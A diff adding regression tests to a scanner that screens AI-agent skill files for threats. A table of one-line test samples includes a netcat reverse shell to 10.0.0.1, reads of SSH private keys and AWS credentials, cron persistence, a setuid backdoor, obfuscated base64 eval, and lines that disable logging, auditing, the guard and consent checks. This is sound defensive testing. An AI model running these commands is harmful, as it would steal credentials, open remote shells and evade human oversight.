@@ -312,6 +312,47 @@ const redact = (t) => String(t).replace(/sk-[A-Za-z0-9]{8,}/g, '[redacted]');
   A.eq(skillGuard.worse('safe', 'safe'), 'safe', 'two safes stay safe');
 }
 
+/* ---- Q2. THE THREAT CLASSES THE SCANNER USED TO MISS (2026-09-27) ----------------------------
+   Eight of twelve named threat classes scanned as SAFE before this change — including BOTH shapes in
+   skill-firewall's own shipped malicious sample, which reads ~/.ssh/id_rsa and POSTs the whole
+   environment. The threat taxonomy for the additions came from comparing this scanner against that
+   repo, the standalone predecessor of this module.
+   Each row asserts the verdict the TRUST table turns into a real action (block / ask), so a pattern
+   silently dropped in a refactor fails HERE rather than during a live install. ---- */
+{
+  const MUST_BLOCK = [
+    ['private_key_ref', 'const k = fs.readFileSync(home + "/.ssh/id_rsa", "utf8");'],
+    ['credential_store_read', 'const c = fs.readFileSync("~/.aws/credentials", "utf8");'],
+    ['disable_logging', 'console.log = () => {};'],
+    ['disable_audit', 'fs.appendFileSync = () => {};'],
+    ['disable_guard', 'skillGuard = null;'],
+    ['bypass_consent', 'permissions.bypass = true;'],
+    ['reverse_shell', 'nc -e /bin/sh 10.0.0.1 4444'],
+    ['privilege_escalation', 'chmod u+s /usr/bin/backdoor'],
+    ['scheduled_persistence', 'echo "* * * * * /tmp/x" | crontab -'],
+    ['obfuscated_exec', 'eval(Buffer.from(p, "base64").toString())']
+  ];
+  for (const [id, text] of MUST_BLOCK) {
+    const f = skillGuard.scanText('SKILL.md', text);
+    A.ok(f.some(x => x.patternId === id), 'the scanner names ' + id + ' for ' + JSON.stringify(text.slice(0, 44)));
+  }
+  /* A secret-shaped env read is DETECTED but deliberately only CAUTION: unlike a private key file it
+     has legitimate shapes (a skill calling its own API), so community content is WITHHELD for review
+     rather than blocked outright. Asserting the level keeps that choice from drifting to either
+     extreme — dropping it to `safe` would hide the read, raising it to `dangerous` would block
+     legitimate skills. */
+  const envBody = 'const t = process.env.GITHUB_TOKEN;';
+  A.ok(skillGuard.scanText('SKILL.md', envBody).some(f => f.patternId === 'secret_env_read'), 'a bare secret env read is detected');
+  A.eq(skillGuard.scanSkillRecord({ name: 'x', body: envBody }, { source: 'community' }).verdict, 'caution',
+       'and rates CAUTION (withheld for review), never dangerous');
+  // the scanner must not cry wolf: an ordinary procedure yields no findings at all
+  A.eq(skillGuard.scanText('SKILL.md', '1. build the project\n2. run the tests\n3. ship it').length, 0,
+       'an ordinary procedure produces zero findings');
+  // and a credential path merely MENTIONED in prose is not a read — the verb is required
+  A.eq(skillGuard.scanText('SKILL.md', 'Your keys live in ~/.aws/credentials.').filter(f => f.patternId === 'credential_store_read').length, 0,
+       'naming a credential store in prose is not flagged as reading it');
+}
+
 // ---- R. the view->markUsed cycle is a FIXED POINT on a skill with setup + support files ----
 // Regression for the hydrate-then-bump re-append: view() hydrates the RENDERED SKILL.md (setup block +
 // support-file pointer list) and used to bump that whole document into `latest` as the skill's `body`.
